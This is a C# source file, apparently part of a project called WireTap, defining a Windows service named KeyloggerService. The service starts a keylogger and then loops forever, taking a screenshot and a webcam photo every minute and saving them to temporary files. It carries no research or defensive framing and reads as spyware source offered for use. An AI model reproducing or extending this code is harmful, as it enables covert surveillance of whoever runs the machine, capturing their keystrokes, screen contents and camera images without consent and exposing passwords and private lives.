namespace WireTap.WindowsService
{
    using System;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.Data;
    using System.Diagnostics;
    using System.Linq;
    using System.ServiceProcess;
    using System.Text;
    using System.Threading.Tasks;

    partial class KeyloggerService : ServiceBase
    {
        public KeyloggerService()
        {
            InitializeComponent();
        }

        protected override async void OnStart(string[] args)
        {
            var startKeyloggerTask = Task.Factory.StartNew(() => StartKeylogger());

            var tasks = new List<Task>
            {
                startKeyloggerTask,
                StartScreenshotServiceAsync(),
                StartWebCameraServiceAsync()
            };

            Console.WriteLine("Starting services");
            await Task.WhenAll(tasks);
            Console.WriteLine("Stopping services");
        }

        public void StartKeylogger()
        {
            Console.WriteLine("Inside StartKeylogger");
            Keyboard.StartKeylogger();
        }

        public async Task StartScreenshotServiceAsync()
        {
            while (true)
            {
                try
                {
                    Console.WriteLine("Inside captureScreenshot");
                    var tempFile = Helpers.CreateTempFileName(".jpeg", "screenshot-");
                    Display.CaptureImage(tempFile);
                    Console.WriteLine("[+] Screenshot captured at: {0}", tempFile);
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message + '\n' + ex.StackTrace);
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
            }
        }

        public async Task StartWebCameraServiceAsync()
        {
            while (true)
            {
                try
                {
                    Console.WriteLine("Inside captureWebCam");
                    string tempFile = Helpers.CreateTempFileName(".jpeg", "webcam-");
                    WebCam.CaptureImage(tempFile);
                    Console.WriteLine("[+] WebCam captured at: {0}", tempFile);
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message + '\n' + ex.StackTrace);
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
            }
        }

        protected override void OnStop()
        {
            // TODO: Add code here to perform any tear-down necessary to stop your service.
        }
    }
}
